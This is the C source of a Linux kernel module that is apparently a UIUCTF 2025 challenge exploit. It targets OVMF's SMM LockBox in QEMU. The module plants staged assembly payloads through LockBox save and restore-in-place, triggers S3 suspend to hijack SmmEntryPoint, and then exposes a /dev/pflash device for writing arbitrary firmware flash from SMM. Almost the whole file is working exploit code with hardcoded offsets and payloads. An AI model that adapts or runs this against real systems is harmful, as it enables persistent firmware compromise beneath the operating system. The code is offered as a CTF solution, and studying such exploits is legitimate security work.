// SPDX-License-Identifier: Apache-2.0
/*
 * Copyright 2025 Google LLC.
 */

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/efi.h>
#include <linux/miscdevice.h>
#include <linux/suspend.h>
#include <asm/tlbflush.h>
#include <asm/io.h>

#define  BIT0     0x00000001
#define  BIT1     0x00000002
#define  BIT2     0x00000004
#define  BIT3     0x00000008
#define  BIT4     0x00000010
#define  BIT5     0x00000020
#define  BIT6     0x00000040
#define  BIT7     0x00000080

typedef u64 UINT64;
typedef u32 UINT32;
typedef u16 UINT16;
typedef u8 UINT8;
typedef unsigned long UINTN;

typedef void VOID;
typedef void *EFI_HANDLE;
typedef bool BOOLEAN;
typedef efi_status_t EFI_STATUS;
typedef UINTN EFI_PHYSICAL_ADDRESS;

typedef struct {
	UINTN                   Signature;
	EFI_HANDLE              SmmIplImageHandle;
	UINTN                   SmramRangeCount;
	void *SmramRanges;
	void *SmmEntryPoint;
	BOOLEAN                  SmmEntryPointRegistered;
	BOOLEAN                  InSmm;
	void *Smst;
	VOID                     *CommunicationBuffer;
	UINTN                    BufferSize;
	EFI_STATUS               ReturnStatus;
	EFI_PHYSICAL_ADDRESS     PiSmmCoreImageBase;
	UINT64                   PiSmmCoreImageSize;
	EFI_PHYSICAL_ADDRESS     PiSmmCoreEntryPoint;
} SMM_CORE_PRIVATE_DATA;

typedef struct {
	UINT32 Data1;
	UINT16 Data2;
	UINT16 Data3;
	UINT8 Data4[8];
} EFI_GUID;

typedef struct {
	EFI_GUID    HeaderGuid;
	UINTN       MessageLength;
	// UINT8       Data[1];
} EFI_SMM_COMMUNICATE_HEADER;

#define EFI_SMM_LOCK_BOX_COMMAND_SAVE                  0x1
#define EFI_SMM_LOCK_BOX_COMMAND_UPDATE                0x2
#define EFI_SMM_LOCK_BOX_COMMAND_RESTORE               0x3
#define EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES        0x4
#define EFI_SMM_LOCK_BOX_COMMAND_RESTORE_ALL_IN_PLACE  0x5

#define LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE  BIT0
#define LOCK_BOX_ATTRIBUTE_RESTORE_IN_S3_ONLY  BIT1

typedef struct {
	UINT32    Command;
	UINT32    DataLength;
	UINT64    ReturnStatus;
} EFI_SMM_LOCK_BOX_PARAMETER_HEADER;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
	EFI_GUID                             Guid;
	EFI_PHYSICAL_ADDRESS                 Buffer;
	UINT64                               Length;
} EFI_SMM_LOCK_BOX_PARAMETER_SAVE;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
	EFI_GUID                             Guid;
	UINT64                               Offset;
	EFI_PHYSICAL_ADDRESS                 Buffer;
	UINT64                               Length;
} EFI_SMM_LOCK_BOX_PARAMETER_UPDATE;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
	EFI_GUID                             Guid;
	EFI_PHYSICAL_ADDRESS                 Buffer;
	UINT64                               Length;
} EFI_SMM_LOCK_BOX_PARAMETER_RESTORE;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
	EFI_GUID                             Guid;
	UINT64                               Attributes;
} EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
} EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE;

struct LockBoxLayout {
	EFI_SMM_COMMUNICATE_HEADER header;
	union lockboxparam {
		EFI_SMM_LOCK_BOX_PARAMETER_SAVE save;
		EFI_SMM_LOCK_BOX_PARAMETER_UPDATE update;
		EFI_SMM_LOCK_BOX_PARAMETER_RESTORE restore;
		EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES setattr;
		EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE restoreall;
	} lockboxparam;
};

noinline __noclone
static void smi(void)
{
	__asm__ __volatile__(
		"xor %%eax,%%eax\n"
		"outb %%al,$0xB3\n"
		"outb %%al,$0xB2\n"
		"jmp 1f\n"
		"1:\n"
		::: "rax","memory"
	);
}

static unsigned long RtDataPhys;
module_param(RtDataPhys, ulong, 0);
static void *RtDataVirt;
static unsigned long PiSmmIplPhys;
module_param(PiSmmIplPhys, ulong, 0);
static void *PiSmmIplVirt;

static unsigned long S3Resume2PeiPhys = 0x00000852CC0;
static void *S3Resume2PeiVirt;

static unsigned long mSmmCorePrivateDataOffset = 0x7160;

static int __init lockbox(union lockboxparam *data)
{
	struct LockBoxLayout *LockBoxReq = RtDataVirt;
	SMM_CORE_PRIVATE_DATA *gSmmCorePrivate =
		PiSmmIplVirt + mSmmCorePrivateDataOffset;

	LockBoxReq->header.HeaderGuid = (EFI_GUID)
		{ 0x2a3cfebd, 0x27e8, 0x4d0a, { 0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0 }};
	LockBoxReq->header.MessageLength = sizeof(struct LockBoxLayout);
	LockBoxReq->lockboxparam = *data;

	gSmmCorePrivate->CommunicationBuffer = (void *)RtDataPhys;
	gSmmCorePrivate->BufferSize = sizeof(EFI_SMM_COMMUNICATE_HEADER) +
		LockBoxReq->header.MessageLength;

	mb();
	smi();

	return 0;
}

__asm__ (
	/* Stage 2 Payload: Executed post-PEI while SMRAM open, find
	   SmmEntryPoint and overwrite it with with stage 3 payload */
	" .data                                    \n"
	"PiSmmIpl_off_mSmmCorePrivateData = 0x7160 \n"
	"SmmCpuPrivateData_off_SmmEntryPoint = 32  \n"
	"payload_stage2:                           \n"
	" pushf                                    \n"
	" push %rdi                                \n"
	" push %rsi                                \n"
	" push %rcx                                \n"
	" mov payload_PiSmmIplPhys(%rip),%rdi      \n"
	" mov (PiSmmIpl_off_mSmmCorePrivateData+SmmCpuPrivateData_off_SmmEntryPoint)(%rdi),%rdi \n"
	" lea payload_stage3(%rip),%rsi            \n"
	" mov $(payload_end-payload_stage3),%rcx   \n"
	" rep movsb                                \n"
	" pop %rcx                                 \n"
	" pop %rsi                                 \n"
	" pop %rdi                                 \n"
	" popf                                     \n"

	" push $(0x00000852CC0+0x00000000000029e0) \n" // S3Resume2PeiPhys + jump target
	" ret                                      \n"

	"payload_PiSmmIplPhys:                     \n"
	" .quad 0                                  \n"

	/* Stage 3 Payload: Executed in SMM, handle write request */
	"payload_stage3:                           \n"
	" push %rsi                                \n"
	" push %rbx                                \n"
	" mov payload_RtDataPhys(%rip),%rdx        \n"
	" lea 0x1000(%rdx),%rsi                    \n"
	" mov 0x500(%rdx),%rbx                     \n"
	" mov 0x508(%rdx),%rcx                     \n"
	" test %rcx,%rcx                           \n"
	"write_loop:                               \n"
	" jz write_return                          \n"
	" lodsb                                    \n"
	" movb $0x10,(%rbx)                        \n" // CFI Single Byte Program
	" mov %al,(%rbx)                           \n"
	" inc %rbx                                 \n"
	" dec %rcx                                 \n"
	" jmp write_loop                           \n"
	"write_return:                             \n"
	" pop %rbx                                 \n"
	" pop %rsi                                 \n"
	" ret                                      \n"

	"payload_RtDataPhys:                       \n"
	" .quad 0                                  \n"

	"payload_end:"
	" .text                                    \n"
	" .code64                                  \n"
);

extern char payload_stage2, payload_end;
static ptrdiff_t S3Resume2Pei_payload_off = 0x00000000000028b8;
extern unsigned long payload_PiSmmIplPhys;
extern unsigned long payload_RtDataPhys;

static void install_payload(void)
{
	PiSmmIplVirt = ioremap(PiSmmIplPhys, 0x10000);
	S3Resume2PeiVirt = ioremap(S3Resume2PeiPhys, 0x10000);

	payload_PiSmmIplPhys = PiSmmIplPhys;
	payload_RtDataPhys = RtDataPhys;

	memcpy(S3Resume2PeiVirt + S3Resume2Pei_payload_off, &payload_stage2,
		&payload_end-&payload_stage2);

	lockbox(&(union lockboxparam){ .save = {
		.Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_SAVE,
		.Header.DataLength   = sizeof (EFI_SMM_LOCK_BOX_PARAMETER_SAVE),
		.Header.ReturnStatus = (UINT64)-1,
		.Guid                = (EFI_GUID)
			{ 0xda1a9002, 0x041b, 0x44b4, { 0xa9, 0x17, 0xfc, 0xe3, 0x89, 0xfd, 0x0a, 0xa1 }},
		.Buffer              = S3Resume2PeiPhys + S3Resume2Pei_payload_off,
		.Length              = &payload_end-&payload_stage2,
	}});

	lockbox(&(union lockboxparam){ .setattr = {
		.Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES,
		.Header.DataLength   = sizeof (EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES),
		.Header.ReturnStatus = (UINT64)-1,
		.Guid                = (EFI_GUID)
			{ 0xda1a9002, 0x041b, 0x44b4, { 0xa9, 0x17, 0xfc, 0xe3, 0x89, 0xfd, 0x0a, 0xa1 }},
		.Attributes          = LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE,
	}});

	pm_suspend(PM_SUSPEND_MEM);
}

/* Regarding where the pflash is mapped in memory:
   OVMF:OvmfPkg/Include/Fdf/OvmfPkgDefines.fdf.inc defines:
     !if $(FD_SIZE_IN_KB) == 4096
     DEFINE VARS_SIZE         = 0x84000
     DEFINE FW_BASE_ADDRESS   = 0xFFC00000
     DEFINE FW_SIZE           = 0x00400000
     DEFINE CODE_BASE_ADDRESS = 0xFFC84000
     DEFINE CODE_SIZE         = 0x0037C000
     !endif

   QEMU:hw/i386/pc_sysfw.c:pc_system_flash_map implements:
     total_size += size;
     gpa = 0x100000000ULL - total_size;
     qdev_prop_set_uint32(DEVICE(system_flash), "num-blocks",
                          size / FLASH_SECTOR_SIZE);
     sysbus_realize_and_unref(SYS_BUS_DEVICE(system_flash), &error_fatal);
     sysbus_mmio_map(SYS_BUS_DEVICE(system_flash), 0, gpa);

   Therefore:
     0xFFC00000 - 0xFFFC84000: OVMF_VARS.fd
     0xFFC84000 -0x1000000000: OVMF_CODE.fd
 */

#define FW_BASE_ADDRESS 0xFFC00000UL
#define FW_SIZE 0x00400000UL

static void *PflashVirt;

static loff_t pflash_misc_llseek(struct file *file, loff_t offset, int origin)
{
	return generic_file_llseek_size(file, offset, origin, MAX_LFS_FILESIZE,
					FW_SIZE);
}

static ssize_t pflash_misc_read(struct file *file, char __user *buf,
				size_t count, loff_t *ppos)
{
	if (*ppos >= FW_SIZE)
		return 0;

	count = min_t(size_t, count, FW_SIZE - *ppos);
	count = min_t(size_t, count, PAGE_SIZE);

	if (copy_to_user(buf, PflashVirt + *ppos, count))
		return -EFAULT;

	*ppos += count;
	return count;
}

static ssize_t pflash_misc_write(struct file *file, const char __user *buf,
				 size_t count, loff_t *ppos)
{
	unsigned long *shared_pos = RtDataVirt + 0x500;
	unsigned long *shared_len = shared_pos + 1;

	if (*ppos >= FW_SIZE)
		return 0;

	count = min_t(size_t, count, FW_SIZE - *ppos);
	count = min_t(size_t, count, PAGE_SIZE);

	if (copy_from_user(RtDataVirt + 0x1000, buf, count))
		return -EFAULT;

	*shared_pos = FW_BASE_ADDRESS + *ppos;
	*shared_len = count;

	mb();
	smi();

	*shared_pos = *shared_len = 0;

	*ppos += count;
	return count;
}

static const struct file_operations pflash_misc_fops = {
	.owner = THIS_MODULE,
	.llseek = pflash_misc_llseek,
	.read = pflash_misc_read,
	.write = pflash_misc_write,
};

static struct miscdevice pflash_misc = {
	MISC_DYNAMIC_MINOR,
	"pflash",
	&pflash_misc_fops,
};

static void install_cdev(void)
{
	PflashVirt = ioremap(FW_BASE_ADDRESS, FW_SIZE);

	BUG_ON(misc_register(&pflash_misc));
}

static int __init exploit_init(void)
{
	if (!RtDataPhys || !PiSmmIplPhys)
		return -EINVAL;

	RtDataVirt = ioremap(RtDataPhys, 0x2000);
	memset(RtDataVirt, 0, 0x2000);

	install_payload();
	install_cdev();

	return 0;
}

module_init(exploit_init);

MODULE_AUTHOR("YiFei Zhu");
MODULE_DESCRIPTION("UIUCTF 2025");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");
